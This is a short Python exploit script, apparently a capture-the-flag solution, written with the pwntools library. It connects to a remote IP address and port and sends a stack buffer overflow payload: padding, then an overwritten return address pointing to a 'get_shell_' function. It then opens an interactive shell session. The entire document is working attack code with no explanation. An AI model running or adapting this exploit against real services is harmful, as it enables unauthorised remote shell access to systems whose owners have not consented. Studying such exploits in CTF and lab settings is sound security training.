from pwn import *

p = remote("114.116.54.89" , 10003)
elf = ELF("./pwn2")
payload = "a" * 0x30 + "b" * 0x8 + p64(elf.sym["get_shell_"])
p.sendafter("say something?" ,payload)
p.interactive()